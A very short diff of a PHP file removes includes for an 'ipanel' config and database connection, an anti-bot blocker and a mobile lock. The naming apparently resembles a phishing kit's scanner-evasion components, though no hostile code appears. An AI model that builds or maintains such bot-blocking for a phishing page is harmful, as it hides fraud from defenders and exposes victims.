@@ -1,13 +1,4 @@
 <?php
-include 'ipanel/inc/config.php';
-include 'ipanel/inc/connect.php';
-include 'new_anti_config.php';
-if ($internal_antibot == 1) {
-   include "ipanel/inc/old_blocker.php";
-}
-if ($mobile_lock == "checked") {
-   include "ipanel/inc/mob_lock.php";
-}
 $url = $_SERVER['REQUEST_URI'];
 
 
